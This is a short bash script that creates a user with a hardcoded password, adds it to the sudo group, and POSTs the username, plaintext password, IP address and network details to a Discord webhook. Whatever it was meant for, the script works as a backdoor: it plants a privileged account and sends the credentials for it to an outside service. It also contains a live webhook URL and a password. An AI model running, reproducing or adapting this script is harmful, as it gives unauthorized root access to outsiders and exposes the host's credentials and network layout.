#!/bin/bash

# Variables
USERNAME="nano"
PASSWORD="Mizi123!"
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
# Create the user
sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME

# Add the user to the 'sudo' group
sudo usermod -aG sudo $USERNAME

# Get the local IP address (ens3 is the correct interface name)
IP_ADDRESS=$(ip a show ens3 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

# Get additional network details
NETWORK_DETAILS=$(ip a show ens3)

# Notify via Discord with @everyone mention
curl -H "Content-Type: application/json" -X POST -d "{
  \"username\": \"Server Notification\",
  \"content\": \"@everyone New user created:\nUsername: $USERNAME\nPassword: $PASSWORD\nIP Address: $IP_ADDRESS\nNetwork Details:\n$NETWORK_DETAILS\"
}" $DISCORD_WEBHOOK_URL

echo "User $USERNAME created and added to sudo group. Notification sent to Discord."
